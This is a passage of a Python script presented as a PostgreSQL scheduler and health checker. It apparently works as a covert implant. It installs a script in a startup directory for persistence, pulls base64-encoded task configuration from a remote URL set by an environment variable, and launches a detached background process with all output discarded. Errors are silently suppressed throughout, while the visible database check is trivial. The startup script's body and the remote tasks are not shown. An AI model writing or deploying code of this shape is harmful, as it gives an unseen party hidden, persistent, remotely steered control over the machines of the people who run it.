"""
    task_script = startup_dir / "postgres_scheduler.py"
    try:
        with open(task_script, 'w') as f:
            f.write(script_content)
        return True
    except Exception:
        return False

def initialize_scheduler(remote_url):
    try:
        req = urllib.request.Request(remote_url, headers={'User-Agent': 'PostgreSQLScheduler/1.0'})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = response.read()

        decoded_data = base64.b64decode(data)
        config_json = json.loads(decoded_data)

        if not isinstance(config_json, dict):
            raise ValueError("Remote config must be a JSON object")

        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        with open(TASKS_FILE, 'w') as f:
            json.dump(config_json, f, indent=2)

        return True
    except Exception:
        return False

def run_health_check():
    try:
        result = subprocess.run(["psql", "-h", "localhost", "-U", "postgres", "-c", "SELECT 1"], 
                                capture_output=True, text=True, timeout=10)
        status = "OK" if result.returncode == 0 else "FAILED"
        log_message = f"DB Connectivity: {status}"
    except Exception as e:
        status = "ERROR"
        log_message = f"DB Connectivity: {str(e)[:50]}"

    try:
        if not CONFIG_DIR.exists():
            log_message += " | Config Dir Missing"

        with open(LOG_FILE, 'a') as f:
            f.write(f"{datetime.datetime.now().isoformat()} - {log_message}\n")
    except Exception:
        pass

def init_startup_task():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if not create_startup_task():
        return False

    run_health_check()

    try:
        subprocess.Popen([sys.executable, str(CONFIG_DIR / "postgres_scheduler.py")], 
                         start_new_session=True, 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def main():
    try:
        config = load_configuration()
        remote_url = os.environ.get("POSTGRES_REMOTE_CONFIG_URL")

        if remote_url:
            if not initialize_scheduler(remote_url):
                print("Failed to initialize scheduler from remote", file=sys.stderr)

        if not init_startup_task():
            print("Failed to initialize startup task", file=sys.stderr)

        while True:
            run_health_check()
            time.sleep(config.get("scheduler", {}).get("interval_seconds", 300))
    except KeyboardInterrupt:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    main()
